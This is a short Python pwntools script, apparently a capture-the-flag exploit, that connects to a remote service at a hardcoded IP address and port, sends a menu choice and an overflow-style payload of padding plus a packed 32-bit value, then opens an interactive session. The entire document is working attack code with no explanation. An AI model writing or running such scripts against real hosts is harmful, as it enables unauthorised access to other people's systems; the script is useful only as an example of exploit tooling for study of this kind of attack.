from pwn import *

sh = process('./test')
sh = remote('115.28.79.166',5555)

sh.sendline('33')

payload = 'a'*8 + p32(0x786)

sh.sendline(payload)

sh.interactive()


